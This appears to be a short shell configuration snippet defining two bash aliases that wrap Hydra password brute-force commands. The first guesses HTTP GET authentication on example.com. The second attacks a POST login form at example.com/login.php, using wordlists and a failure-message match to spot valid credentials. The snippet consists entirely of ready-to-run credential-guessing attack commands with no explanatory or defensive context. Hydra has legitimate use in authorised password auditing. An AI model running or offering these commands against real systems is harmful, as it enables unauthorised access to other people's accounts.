alias hydra-HTTP-GET='hydra -L users.txt -P passwords.txt http-get://example.com/ -V'
alias hydra-HTTP-POST-FROM='hydra -L user.txt -P pass.txt "http-post-form://example.com/login.php:username=^USER^&password=^PASS^&submit=Login:Invalid credentials" -V'
